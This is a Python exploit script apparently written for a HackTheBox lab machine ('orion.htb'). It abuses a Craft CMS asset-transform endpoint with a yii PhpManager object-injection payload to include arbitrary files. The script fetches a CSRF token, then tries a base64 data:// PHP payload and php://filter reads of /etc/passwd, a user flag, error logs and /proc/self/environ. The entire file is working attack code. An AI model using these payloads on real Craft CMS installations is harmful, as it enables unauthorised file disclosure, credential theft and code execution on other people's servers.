import requests, re, json
from pathlib import Path
from config.paths import get_base_dir

HOST = 'http://10.129.54.86'
HEADERS = {'Host': 'orion.htb'}

PHPINFO_PATH = get_base_dir() / "phpinfo_output.html"

def try_include(path, label):
    s = requests.Session()
    r = s.get(f'{HOST}/index.php?p=admin/login', headers=HEADERS, timeout=30)
    m = re.search(r'csrfTokenValue":"([^"]+)"', r.text)
    if not m:
        print(f'  [{label}] No CSRF')
        return None
    csrf = m.group(1)
    body = {
        'assetId': 11,
        'handle': {
            'width': 1, 'height': 1,
            'as session': {
                'class': 'yii\\rbac\\PhpManager',
                'itemFile': path
            }
        }
    }
    headers = {**HEADERS, 'Content-Type': 'application/json', 'X-CSRF-Token': csrf}
    r2 = s.post(f'{HOST}/index.php?p=admin/actions/assets/generate-transform',
               json=body, headers=headers, timeout=30)
    extra = ''
    if 'LOL!' in r2.text:
        extra += ' [LOL! FOUND]'
    if 'root:' in r2.text:
        extra += ' [root: FOUND]'
    if 'PD9waHA' in r2.text:
        i = r2.text.index('PD9waHA')
        extra += ' [base64 at {}: {}]'.format(i, r2.text[i:i+50])
    print('  [{}] {} {} bytes{}'.format(label, r2.status_code, len(r2.text), extra), flush=True)
    return r2

print('[*] Testing various include paths:', flush=True)

try_include('data://text/plain;base64,PD9waHAgZWNobyAiTE9MISI7ID8+', 'data://')
try_include('php://filter/read=convert.base64-encode/resource=/etc/passwd', 'filter/passwd')
try_include('php://filter/read=convert.base64-encode/resource=/home/adam/user.txt', 'filter/user')
try_include('php://filter/read=convert.base64-encode/resource=/var/www/html/craft/storage/logs/phperrors.log', 'filter/errlog')
try_include('/etc/passwd', 'direct/passwd')
try_include('/proc/self/environ', '/proc/environ')
try_include('/var/www/html/craft/storage/logs/phperrors.log', 'direct/errlog')

print()
print('Checking phpinfo for allow_url_include...', flush=True)
try:
    with open(PHPINFO_PATH) as f:
        html = f.read()
        for line in html.split('<tr'):
            if 'allow_url' in line or 'disable_functions' in line:
                print('  <tr' + line.strip()[:200])
        print('  Total phpinfo size: {} bytes'.format(len(html)))
except FileNotFoundError:
    print('  phpinfo_output.html not found')
